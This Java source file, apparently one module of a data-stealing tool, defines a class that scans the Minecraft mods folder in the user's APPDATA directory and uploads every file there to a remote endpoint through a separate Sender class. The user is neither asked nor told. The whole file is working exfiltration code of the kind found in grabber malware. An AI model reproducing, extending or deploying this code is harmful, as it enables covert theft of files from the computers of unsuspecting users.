package io.github.luxotick.impl;

import io.github.luxotick.Sender;
import okhttp3.*;

import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.util.zip.*;

public class Mods {

    public static void main(String[] args) throws IOException {
        OkHttpClient client = new OkHttpClient();

        File folder = new File((System.getenv("APPDATA") + "\\.minecraft\\" + "mods"));

        if (folder.exists() && folder.isDirectory() && folder.listFiles() != null) {
            for (File file : folder.listFiles()) {

                RequestBody requestBody = new MultipartBody.Builder()
                        .setType(MultipartBody.FORM)
                        .addFormDataPart("file", file.getName(), RequestBody.create(MediaType.parse("application/octet-stream"), file))
                        .build();

                Sender.sendFile(client, requestBody);
            }
        }
    }
}